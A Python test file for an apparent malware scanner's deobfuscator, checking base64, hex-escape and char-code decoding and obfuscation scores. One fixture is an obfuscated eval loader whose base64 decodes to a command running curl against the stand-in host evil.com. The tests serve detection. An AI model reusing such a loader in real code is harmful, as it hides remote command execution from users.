"""Tests for deobfuscator."""

from app.scanners.llm.deobfuscator import deobfuscate


def test_decode_base64():
    code = """var x = Buffer.from('aGVsbG8gd29ybGQ=', 'base64').toString();"""
    result, score = deobfuscate(code)
    assert "hello world" in result
    assert score > 0.0


def test_expand_hex_escapes():
    code = r"""var x = "\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64";"""
    result, score = deobfuscate(code)
    assert "hello world" in result


def test_expand_char_codes():
    code = """var x = String.fromCharCode(104, 101, 108, 108, 111, 32);"""
    result, score = deobfuscate(code)
    assert "hello" in result


def test_clean_code_low_score():
    code = """
const express = require('express');
const app = express();
app.get('/', (req, res) => res.send('Hello'));
app.listen(3000);
"""
    _, score = deobfuscate(code)
    assert score < 0.3


def test_heavily_obfuscated_high_score():
    code = """
var _0x1234 = 'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cHM6Ly9ldmlsLmNvbScpOw==';
eval(Buffer.from(_0x1234, 'base64').toString());
var a = "\\x72\\x65\\x71\\x75\\x69\\x72\\x65";
var b = String.fromCharCode(99, 104, 105, 108, 100, 95);
"""
    _, score = deobfuscate(code)
    assert score > 0.2


def test_empty_content():
    result, score = deobfuscate("")
    assert score == 0.0
    assert result == ""
